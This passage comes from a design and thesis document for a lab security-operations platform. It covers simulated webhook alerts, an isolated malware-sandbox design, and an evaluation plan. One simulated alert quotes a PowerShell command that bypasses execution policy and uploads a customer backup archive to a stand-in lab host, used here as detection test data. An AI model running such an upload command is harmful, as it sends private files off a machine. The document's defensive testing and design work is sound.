        "id": ["T1041", "T1567.002", "T1105"],
        "tactic": ["Exfiltration", "Command and Control"],
        "technique": ["Exfiltration Over C2 Channel", "Exfiltration to Cloud Storage", "Ingress Tool Transfer"]
      }
    },
    "agent": {"id": "002", "name": "win10-victim", "ip": "192.168.122.98"},
    "decoder": {"name": "windows-exfiltration-simulation"},
    "location": "EventChannel",
    "data": {
      "srcip": "192.168.122.98",
      "dstip": "104.21.0.170",
      "srcport": "50144",
      "dstport": "443",
      "protocol": "TCP",
      "action": "allowed",
      "domain": "transfer.socaas-lab.example",
      "dns_query": "transfer.socaas-lab.example",
      "url": "https://transfer.socaas-lab.example/upload",
      "http_method": "POST",
      "http_status": "200",
      "bytes_sent": "52428800",
      "bytes_received": "2048",
      "file_name": "customer_backup.zip",
      "file_path": "C:\\\\Users\\\\win10-victim\\\\Documents\\\\customer_backup.zip",
      "file_hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
      "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
      "process_name": "powershell.exe",
      "parent_process": "explorer.exe",
      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://transfer.socaas-lab.example/upload -Method POST -InFile C:\\\\Users\\\\win10-victim\\\\Documents\\\\customer_backup.zip",
      "username": "win10-victim\\\\khalil",
      "event_id": "3",
      "providerName": "Microsoft-Windows-Sysmon",
      "channel": "Microsoft-Windows-Sysmon/Operational"
    },
    "full_log": "Microsoft-Windows-Sysmon Event ID 3: Possible data exfiltration. Image=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe User=win10-victim\\\\khalil SourceIp=192.168.122.98 DestinationIp=104.21.0.170 DestinationPort=443 BytesSent=52428800 FileName=customer_backup.zip"
  }'
```

Expected:

```text
alert_type = exfiltration/network
case/email should mention cloud upload, large outbound transfer, file path, process, user, and destination.
```

### 22.4 Malware Event for Sandbox Testing

Purpose:

- Validate malware classification.
- Validate VirusTotal file hash lookup.
- Validate future AI sandbox workflow trigger.

```bash
curl -sS -X POST http://192.168.122.1:30001/hooks/wazuh \
  -H "X-SOCaaS-Webhook-Secret: <WEBHOOK_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "sandbox-malware-'"$(date +%s)"'",
    "source": "wazuh",
    "manager": {"name": "socaas-wazuh-manager-0"},
    "rule": {
      "id": "554",
      "level": 12,
      "description": "EICAR test file detected - known malware hash",
      "groups": ["malware", "eicar", "windows", "sandbox-test"],
      "mitre": {
        "id": ["T1204", "T1105"],
        "tactic": ["Execution", "Command and Control"],
        "technique": ["User Execution", "Ingress Tool Transfer"]
      }
    },
    "agent": {"id": "002", "name": "win10-victim", "ip": "192.168.122.98"},
    "decoder": {"name": "windows-malware-simulation"},
    "location": "EventChannel",
    "data": {
      "srcip": "192.168.122.98",
      "dstip": "192.168.122.1",
      "action": "dropped",
      "file_name": "update_helper.exe",
      "file_path": "C:\\\\Users\\\\win10-victim\\\\AppData\\\\Roaming\\\\MicrosoftEdge\\\\update_helper.exe",
      "file_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
      "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
      "process_name": "update_helper.exe",
      "parent_process": "explorer.exe",
      "command_line": "C:\\\\Users\\\\win10-victim\\\\AppData\\\\Roaming\\\\MicrosoftEdge\\\\update_helper.exe",
      "username": "win10-victim\\\\khalil"
    },
    "full_log": "EICAR test file detected at C:\\\\Users\\\\win10-victim\\\\AppData\\\\Roaming\\\\MicrosoftEdge\\\\update_helper.exe SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f Action=dropped"
  }'
```

Expected:

```text
alert_type = malware
vt_target_type = file_hash
AI sandbox trigger = ready
```

---

## 23. AI Sandbox Feature

The AI Sandbox is a planned advanced malware-analysis feature for SOCaaS. Its objective is to automatically analyze suspicious malware samples from monitored VMs inside a clean, disposable, isolated virtual machine and attach a generated report to the corresponding TheHive case.

### 23.1 Objective

When SOCaaS detects malware on an endpoint:

```text
Wazuh malware alert
   ↓
Shuffle malware workflow
   ↓
AI Sandbox Orchestrator
   ↓
Temporary sandbox VM
   ↓
Static + dynamic analysis
   ↓
AI-generated report
   ↓
Attach report to TheHive case
   ↓
Destroy sandbox VM and delete disk
```

### 23.2 Main Security Rule

The sandbox system must never reuse an infected VM.

Correct lifecycle:

```text
golden image → temporary linked clone → analyze sample → collect report → destroy VM → delete disk
```

Wrong lifecycle:

```text
one permanent sandbox VM reused for every sample
```

### 23.3 High-Level Architecture

```text
                       ┌──────────────────────┐
                       │ Malware Alert         │
                       │ Wazuh / Shuffle       │
                       └──────────┬───────────┘
                                  │
                                  ▼
                       ┌──────────────────────┐
                       │ Build Sandbox Request │
                       │ case_id, hash, path   │
                       └──────────┬───────────┘
                                  │ HTTP POST /analyze
                                  ▼
┌─────────────────────────────────────────────────────────────────┐
│ Local AI Sandbox Orchestrator                                   │
│ - validates request                                             │
│ - creates temporary VM clone                                    │
│ - injects sample                                                │
│ - runs static/dynamic analysis                                  │
│ - calls local/cloud AI for report writing                       │
│ - destroys VM and deletes disk                                  │
└──────────┬──────────────────────────────────────────────┬───────┘
           │                                              │
           ▼                                              ▼
┌──────────────────────┐                        ┌──────────────────────┐
│ Isolated Sandbox VM   │                        │ Fake Internet /       │
│ Windows/Linux clone   │                        │ Network Collector     │
│ no SOC network access │                        │ DNS/HTTP/PCAP logs    │
└──────────┬───────────┘                        └──────────┬───────────┘
           │                                               │
           └──────────────────┬────────────────────────────┘
                              ▼
                   ┌──────────────────────┐
                   │ Sandbox Report        │
                   │ MD/JSON/PCAP/artifacts│
                   └──────────┬───────────┘
                              │
                              ▼
                   ┌──────────────────────┐
                   │ TheHive Case          │
                   │ comment/attachment    │
                   └──────────────────────┘
```

### 23.4 Components

| Component | Purpose |
|----------|---------|
| Golden sandbox image | Clean base VM image used only as a template. |
| Temporary linked clone | Per-sample VM created from the golden image. |
| Isolated sandbox network | Prevents malware from reaching SOC, host LAN, or internet. |
| Fake internet/collector | Captures DNS/HTTP/TCP behavior safely. |
| Sandbox orchestrator API | Receives requests from Shuffle and controls VM lifecycle. |
| Sample collector | Safely obtains malware sample from victim/quarantine. |
| Static analysis engine | Hashes, strings, file type, YARA, PE metadata. |
| Dynamic analysis engine | Executes sample for fixed time and collects behavior. |
| AI report generator | Converts raw analysis artifacts into a readable SOC report. |
| TheHive integration | Adds sandbox summary/report/artifacts to the case. |

### 23.5 Sandbox VM Design

Recommended golden image:

```text
win10-sandbox-golden.qcow2
```

Installed tools:

```text
Sysmon
Process Monitor / Procmon
Process Explorer
Autoruns
Wireshark or tcpdump collector
PEStudio / Detect It Easy
YARA
Python
7-Zip
FakeNet-NG or equivalent fake internet tooling
Custom sandbox runner script
```

Golden image rules:

- Keep it powered off except for maintenance.
- Update tools manually.
- Re-seal the image after tool updates.
- Never analyze malware directly in the golden image.
- All analysis occurs in a clone.

### 23.6 Temporary VM Lifecycle

For each malware case:

```text
1. Generate run_id:
   sandbox-SOC-<timestamp>

2. Create linked disk:
   qemu-img create -f qcow2 -F qcow2 \
     -b /var/lib/libvirt/images/socaas/win10-sandbox-golden.qcow2 \
     /var/lib/libvirt/images/socaas/sandbox-SOC-xxxx.qcow2

3. Define and boot VM:
   virsh define sandbox-SOC-xxxx.xml
   virsh start sandbox-SOC-xxxx

4. Inject sample:
   via ISO, virtio disk, guest agent, or controlled upload service

5. Run analysis:
   timeout 300s sandbox-runner

6. Collect artifacts:
   process tree, registry changes, file changes, pcap, DNS, HTTP, screenshots, dropped files

7. Generate report:
   sandbox_report_SOC-xxxx.md / .json / .pdf

8. Attach report to TheHive case.

9. Destroy VM:
   virsh destroy sandbox-SOC-xxxx
   virsh undefine sandbox-SOC-xxxx --nvram
   rm -f sandbox-SOC-xxxx.qcow2
```

### 23.7 Cleanup Logic

Cleanup must run even when analysis fails:

```bash
virsh destroy "$VM_NAME" || true
virsh undefine "$VM_NAME" --nvram || true
rm -f "/var/lib/libvirt/images/socaas/${VM_NAME}.qcow2"
rm -rf "/opt/socaas-sandbox/runs/${RUN_ID}"
```

The orchestrator should also use a timeout:

```bash
timeout 10m ./run_analysis_job.sh
```

### 23.8 Sandbox Network Isolation

The sandbox should not be connected to `virbr0` or the Kubernetes/SOC network.

Recommended network:

```text
sandbox-net
```

Properties:

| Setting | Recommendation |
|---------|----------------|
| Internet access | Disabled by default |
| Access to SOC services | Denied |
| Access to host LAN | Denied |
| DNS | Fake DNS collector |
| HTTP/HTTPS | Fake web service or transparent collector |
| Packet capture | Enabled |
| Reset after each run | Yes |

Safe topology:

```text
Sandbox VM
   ↓
sandbox-net only
   ↓
Fake Internet / Collector VM
   ↓
Artifacts returned to orchestrator
```

### 23.9 Sample Acquisition Methods

The sandbox cannot analyze a file unless the platform can obtain the sample.

Possible methods:

| Method | Description |
|-------|-------------|
| Endpoint collector | A protected service on the victim uploads the suspicious file to the orchestrator. |
| Wazuh active response | Wazuh copies the file to quarantine/upload location after detection. |
| Sample store | Malware simulations store files in a controlled internal sample repository. |
| Manual upload | Analyst attaches sample to TheHive or a local upload portal. |

For production design, the sample collector should enforce:

- Maximum file size.
- Allowed directories.
- Hash verification.
- Quarantine folder permissions.
- TLS/authentication.
- Audit logging.
- No arbitrary host file reads.

### 23.10 Static Analysis

Static analysis should run before execution:

```text
SHA256 / SHA1 / MD5
File type
PE headers
Import table
Strings
Embedded URLs/domains/IPs
YARA rules
Entropy
Digital signature status
Packer indicators
Known test malware check such as EICAR
```

### 23.11 Dynamic Analysis

Dynamic analysis should run with strict timeout:

```text
Process tree
Child processes
Command line usage
File system changes
Registry changes
Persistence mechanisms
Network connections
DNS queries
HTTP requests
Dropped files
Screenshots
Memory indicators if available
```

### 23.12 AI Report Generation

The AI model should receive only sanitized artifacts:

```json
{
  "case_id": "SOC-...",
  "sample": {
    "file_name": "update_helper.exe",
    "sha256": "..."
  },
  "static_analysis": {},
  "dynamic_analysis": {},
  "network_artifacts": {},
  "yara_matches": [],
  "verdict_candidates": []
}
```

Expected AI report sections:

```text
Executive Summary
Sample Information
Static Analysis Findings
Dynamic Behavior
Network Behavior
Persistence / Evasion
Indicators of Compromise
MITRE ATT&CK Mapping
Risk Rating
Recommended Analyst Actions
Cleanup and Containment Guidance
Appendix: Raw Artifacts
```

### 23.13 TheHive Integration

The sandbox report should be added to TheHive as:

1. A case comment with the summary.
2. A markdown or PDF attachment.
3. Optional observables:
   - file hash
   - dropped hashes
   - contacted domains
   - contacted IPs
   - URLs
   - registry keys
   - mutexes

TheHive tags:

```text
ai-sandbox
sandbox-completed
sandbox-failed
sandbox-risk-high
sandbox-verdict-malicious
```

---

## 24. AI Sandbox Shuffle Workflow

### 24.1 Full Workflow With Sandbox

```text
Webhook_1
   ↓
Normalize_SOC_Alert
   ↓
Build_VirusTotal_Target
   ↓
Virustotal_v3
   ↓
Generate_AI_Recommended_Actions
   ↓
Build_Context_TheHive_Email_Body
   ↓
Create_TheHive_Case
   ↓
Build_AI_Sandbox_Request
   ↓
Request_AI_Sandbox_Analysis
   ↓
Build_TheHive_Sandbox_Update
   ↓
Update_TheHive_Case_With_Sandbox_Report
   ↓
Build_Telegram_Payload
   ↓
Send_Telegram_Notification
   ↓
Send_Email_Notification
   ↓
Final_Response
```

### 24.2 Minimal First Implementation

Start with a simple sandbox path:

```text
Build_Context_TheHive_Email_Body
   ↓
Create_TheHive_Case
   ↓
Build_AI_Sandbox_Request
   ↓
Request_AI_Sandbox_Analysis
   ↓
Build_TheHive_Sandbox_Update
   ↓
Update_TheHive_Case_With_Sandbox_Report
```

Telegram and email can continue normally even if sandbox fails.

### 24.3 `Build_AI_Sandbox_Request`

Purpose:

- Decide whether sandbox should run.
- Build the JSON payload sent to the orchestrator.

Run conditions:

```text
alert_type == malware
AND file_hash exists
AND (file_path exists OR file_name exists)
AND case_id exists
```

Skip examples:

```json
{
  "status": "skipped",
  "should_run_sandbox": false,
  "skip_reason": "Alert type is not malware."
}
```

Ready example:

```json
{
  "status": "ready",
  "should_run_sandbox": true,
  "case_id": "SOC-...",
  "sample_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
  "sandbox_request_json": "{...}"
}
```

### 24.4 `Request_AI_Sandbox_Analysis`

Node type:

```text
HTTP POST
```

URL:

```text
http://192.168.122.1:5055/analyze
```

Headers:

```json
{
  "Content-Type": "application/json",
  "X-SOCaaS-Sandbox-Secret": "<SANDBOX_SECRET>"
}
```

Body:

```text
$Build_AI_Sandbox_Request.message.sandbox_request_json
```

### 24.5 Sandbox Orchestrator Request

```json
{
  "case_id": "SOC-...",
  "thehive_case_id": "<case-id>",
  "alert": {
    "alert_type": "malware",
    "severity": "CRITICAL",
    "score": "21",
    "rule_id": "554",
    "rule_description": "EICAR test file detected - known malware hash"
  },
  "agent": {
    "id": "002",
    "name": "win10-victim",
    "ip": "192.168.122.98"
  },
  "sample": {
    "file_name": "update_helper.exe",
    "file_path": "C:\\Users\\win10-victim\\AppData\\Roaming\\MicrosoftEdge\\update_helper.exe",
    "file_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
  },
  "sandbox_options": {
    "profile": "windows_malware_basic",
    "timeout_seconds": 300,
    "network_mode": "isolated_fake_internet",
    "destroy_vm_after_analysis": true,
    "collect_pcap": true,
    "collect_process_tree": true,
    "collect_file_changes": true,
    "collect_registry_changes": true,
    "generate_ai_report": true
  }
}
```

### 24.6 Sandbox Orchestrator Response

```json
{
  "status": "completed",
  "case_id": "SOC-...",
  "run_id": "sandbox-SOC-...",
  "sandbox_vm": "sandbox-SOC-...",
  "sample_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
  "verdict": "malicious_test_file",
  "risk": "high",
  "summary": "EICAR test file was executed in an isolated sandbox. No persistence or C2 behavior was observed.",
  "report_markdown": "## SOCaaS AI Sandbox Report\n\n...",
  "artifacts": {
    "report_path": "/opt/socaas-sandbox/reports/SOC-xxx.md",
    "pcap_path": "/opt/socaas-sandbox/runs/SOC-xxx/network.pcap",
    "process_tree_path": "/opt/socaas-sandbox/runs/SOC-xxx/process_tree.json"
  },
  "cleanup": {
    "vm_destroyed": true,
    "disk_deleted": true
  }
}
```

### 24.7 `Build_TheHive_Sandbox_Update`

Purpose:

- Convert sandbox response into TheHive case update/comment.
- Handle `completed`, `failed`, and `skipped`.
- Generate tags such as:
  - `ai-sandbox`
  - `sandbox-completed`
  - `sandbox-failed`
  - `sandbox-verdict-malicious`
  - `sandbox-risk-high`

### 24.8 `Update_TheHive_Case_With_Sandbox_Report`

The easiest first implementation is to add a comment to the created case.

Method:

```text
POST
```

URL pattern:

```text
http://192.168.122.1:30900/api/v1/case/<THEHIVE_CASE_ID>/comment
```

Headers:

```json
{
  "Authorization": "Bearer <THEHIVE_API_KEY>",
  "Content-Type": "application/json",
  "X-Organisation": "socaas"
}
```

Body:

```json
{
  "message": "## SOCaaS AI Sandbox Report\n\n..."
}
```

Later, this can be extended to upload attachments.

---

## 25. Local Sandbox Orchestrator Design

The orchestrator is a local service running on the host:

```text
http://192.168.122.1:5055
```

Recommended implementation:

```text
Python 3.12 + FastAPI
libvirt Python bindings or subprocess virsh/qemu-img
YARA
pefile / lief
pcap parser
AI provider client
TheHive API client
```

### 25.1 API Endpoints

| Endpoint | Method | Purpose |
|---------|--------|---------|
| `/healthz` | GET | Health check |
| `/analyze` | POST | Submit malware sample analysis job |
| `/runs/{run_id}` | GET | Retrieve job status/report |
| `/reports/{case_id}` | GET | Download report |
| `/cleanup/{run_id}` | POST | Force cleanup of stuck run |

### 25.2 Orchestrator Main Algorithm

```python
def analyze(request):
    validate_secret()
    validate_request(request)

    run_id = create_run_id(request.case_id)

    try:
        sample = acquire_sample(request.sample)
        static_result = run_static_analysis(sample)

        vm = create_temporary_vm(run_id)
        boot_vm(vm)
        inject_sample(vm, sample)

        dynamic_result = run_dynamic_analysis(vm, timeout=300)
        artifacts = collect_artifacts(vm, run_id)

        report = generate_ai_report(
            request=request,
            static=static_result,
            dynamic=dynamic_result,
            artifacts=artifacts
        )

        return {
            "status": "completed",
            "run_id": run_id,
            "report_markdown": report,
            "cleanup": cleanup(vm, run_id)
        }

    except Exception as e:
        return {
            "status": "failed",
            "run_id": run_id,
            "summary": str(e),
            "cleanup": cleanup_if_needed(run_id)
        }
```

### 25.3 Required Safety Controls

| Control | Reason |
|---------|--------|
| Per-run temporary VM | Avoids sample persistence between analyses. |
| Isolated network | Prevents malware reaching SOC infrastructure. |
| Timeouts | Prevents long-running or stuck samples. |
| Resource limits | Prevents host exhaustion. |
| Strict sample path validation | Prevents arbitrary file collection. |
| Hash verification | Confirms the analyzed sample matches alert metadata. |
| Audit logs | Supports thesis evidence and debugging. |
| Cleanup on failure | Avoids orphaned infected VMs/disks. |
| No AI direct shell access | AI writes report; deterministic orchestrator runs commands. |

---

## 26. Implementation Roadmap for AI Sandbox

### Phase 1 — Design and Skeleton

- Define sandbox network `sandbox-net`.
- Create `/opt/socaas-sandbox/` directory structure.
- Implement FastAPI `/healthz` and `/analyze`.
- Return mock sandbox reports to Shuffle.
- Attach mock report to TheHive.

### Phase 2 — Golden VM

- Build `win10-sandbox-golden.qcow2`.
- Install analysis tools.
- Configure auto-login or guest agent.
- Install sandbox runner.
- Validate snapshot/clone boot.
- Validate cleanup.

### Phase 3 — Static Analysis

- Add hash computation.
- Add file type identification.
- Add strings extraction.
- Add YARA scanning.
- Add PE metadata extraction.

### Phase 4 — Dynamic Analysis

- Boot linked clone.
- Inject sample.
- Execute sample under timeout.
- Collect process, registry, file, and network artifacts.
- Destroy VM and disk.

### Phase 5 — AI Report

- Feed sanitized static/dynamic results into AI model.
- Generate structured markdown report.
- Attach report to TheHive.
- Add sandbox summary to email.

### Phase 6 — Hardening

- Add authentication and audit logging.
- Add concurrency limit.
- Add job queue.
- Add resource cleanup worker.
- Add fake internet services.
- Add support for Linux samples and document macros.

---

## 27. Thesis-Oriented Evaluation Plan

### 27.1 Research Questions

1. Can an open-source SOCaaS platform provide end-to-end detection, enrichment, notification, and case management for SMEs?
2. How effectively can SOAR automation reduce alert handling time?
3. Can AI-generated recommendations improve case quality without replacing analyst validation?
4. Can a disposable VM sandbox safely automate first-level malware triage?
5. What are the trade-offs between open-source flexibility, operational complexity, and security isolation?

### 27.2 Suggested Metrics

| Metric | How to Measure |
|--------|----------------|
| Detection latency | Time from attack/simulation to Wazuh alert. |
| SOAR latency | Time from Wazuh alert to Shuffle workflow completion. |
| Case creation time | Time from alert to TheHive case. |
| Notification reliability | Telegram/email success rate over N tests. |
| Deduplication effectiveness | Raw Wazuh alerts vs forwarded Shuffle executions. |
| VT enrichment accuracy | Correct endpoint selected for IP/hash/domain/URL alerts. |
| AI recommendation quality | Analyst rating or checklist-based evaluation. |
| Sandbox analysis duration | Time from malware alert to report attachment. |
| Sandbox cleanup reliability | VM/disk cleanup success rate. |
| False positive handling | Whether benign Windows events are summarized correctly. |

### 27.3 Thesis Chapter Structure

```text
Chapter 1: Introduction and Problem Statement
Chapter 2: Background — SOC, SIEM, SOAR, TheHive, Wazuh, Kubernetes
Chapter 3: Requirements and Design Objectives
Chapter 4: SOCaaS Architecture and Implementation
Chapter 5: Detection Pipeline and SOAR Workflow
Chapter 6: AI-Assisted Alert Analysis
Chapter 7: AI Sandbox Design and Implementation
Chapter 8: Experiments and Evaluation
Chapter 9: Security Analysis and Limitations
Chapter 10: Conclusion and Future Work
```

---

## 28. Limitations and Security Considerations

| Area | Limitation / Risk | Mitigation |
|------|-------------------|------------|
| AI recommendations | May be incomplete or overly generic | Use deterministic context, guardrails, and analyst validation. |
| Telegram formatting | Shuffle Telegram app can collapse line breaks | Keep Telegram short; use TheHive/email for full context. |
| VirusTotal | Private IPs cannot be meaningfully scored | Skip private IPs; use hashes/domains/public IPs. |
| Sandbox escape | Malware may attempt VM escape | Use isolated VM, patched hypervisor, no host shared folders, no SOC network. |
| Sample acquisition | Pulling files from endpoints can be dangerous | Use controlled quarantine and hash validation. |
| Resource exhaustion | Many alerts could create many VMs | Add queue, concurrency limits, and timeout cleanup. |
| Credential exposure | Lab files may contain secrets | Redact in thesis; rotate all keys before production. |
| No TLS everywhere | Internal HTTP services are easier to intercept | Add TLS for production. |
| Single in-memory dedup cache | Dedup lost on gateway restart | Move dedup state to Redis for production. |

---

## 29. Updated Future Enhancements

| Item | Description |
|------|-------------|
| AI Sandbox MVP | Implement `/analyze` orchestrator with mock reports, then linked-clone VM execution. |
| Report Attachments | Attach markdown/PDF sandbox reports and PCAP/process-tree artifacts to TheHive. |
| Exfiltration Template | Add dedicated `exfiltration` alert type and Telegram/TheHive templates. |
| AI Case Summarization | Generate final incident summaries from TheHive timeline and tasks. |
| Analyst Approval Flow | Require analyst approval before containment or endpoint file collection. |
| Wazuh Active Response | Quarantine files, collect suspicious samples, block confirmed malicious IPs. |
| MISP Integration | Push/receive IOCs to/from MISP. |
| Redis Dedup Store | Replace in-memory dedup with Redis for persistence. |
| Multi-Tenant SOCaaS | Separate TheHive orgs and Wazuh groups per customer. |
| TLS Everywhere | Add HTTPS and internal mTLS for all APIs. |
| Sandbox Profiles | Add Windows PE, PowerShell, Linux ELF, Office macro, and URL detonation profiles. |
| Metrics Dashboard | Grafana dashboard for MTTD, MTTR, case counts, sandbox verdicts, and workflow errors. |

---

## 30. Thesis Notes and Operational Lessons

1. **Deterministic preprocessing is essential before AI.** The normalization and filtering nodes prevent irrelevant fields from appearing in case reports.
2. **AI should not control infrastructure directly.** The sandbox orchestrator should expose safe functions; AI should summarize artifacts.
3. **SOC notifications and SOC reports serve different audiences.** Telegram must be concise, while TheHive and email can contain detailed evidence.
4. **Disposable infrastructure is safer for malware analysis.** Golden image plus temporary clone is the safest operational model.
5. **Workflow reliability depends on variable resolution.** Building full JSON payloads in Python nodes avoids many Shuffle variable interpolation problems.
6. **Case management requires correct organization headers.** TheHive 5.x requires `X-Organisation: socaas` for operational API calls.
7. **Testing should cover both real endpoint telemetry and synthetic webhook events.** Webhook simulation makes repeatable thesis experiments easier.
---

*Document generated for SOCaaS lab environment. Thesis-safe expanded version. Last update: 2026-05-18.*
